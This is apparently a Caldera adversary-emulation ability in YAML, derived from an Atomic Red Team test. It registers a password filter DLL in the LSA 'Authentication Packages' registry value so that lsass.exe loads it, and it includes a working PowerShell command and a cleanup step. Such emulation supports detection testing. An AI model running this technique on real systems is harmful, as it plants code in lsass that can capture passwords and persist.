@@ -1,0 +1,31 @@
+---
+- id: 64b89fddd851d185bb77d2cbcaa9dc94
+  name: Install Additional Authentication Packages
+  description: "lsass.exe loads all DLLs specified by the Authentication Packages\
+    \ REG_MULTI_SZ value.\nUses PowerShell to install and register a password filter\
+    \ DLL. Requires a reboot and administrative privileges.\nThe binary in bin is\
+    \ https://www.virustotal.com/gui/file/95140c1ad39fd632d1c1300b246293297aa272ce6035eecc3da56e337200221d/detection\n\
+    Source is in src folder. \nThis does require a reboot to see the filter loaded\
+    \ into lsass.exe. \nIt does require Administrative privileges to import the clean\
+    \ registry values back into LSA, it is possible you may have to manually do this\
+    \ after for cleanup.\n"
+  tactic: multiple
+  technique:
+    attack_id: T1556.002
+    name: 'Modify Authentication Process: Password Filter DLL'
+  platforms:
+    windows:
+      psh:
+        command: reg.exe export HKLM\SYSTEM\CurrentControlSet\Control\Lsa\ "PathToAtomicsFolder\T1556.002\lsa_backup.reg";
+          $passwordFilterName = (Copy-Item "PathToAtomicsFolder\T1556.002\bin\AtomicRedTeamPWFilter.dll"
+          -Destination "C:\Windows\System32" -PassThru).basename; $lsaKey = Get-Item
+          "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"; $AuthenticationPackagesValues
+          = $lsaKey.GetValue("Authentication Packages"); $AuthenticationPackagesValues
+          += $passwordFilterName; Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\"
+          "Authentication Packages" $AuthenticationPackagesValues
+        payloads: []
+        cleanup: reg.exe import "PathToAtomicsFolder\T1556.002\lsa_backup.reg"; remove-item
+          C:\Windows\System32\AtomicRedTeamPWFilter.dll
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
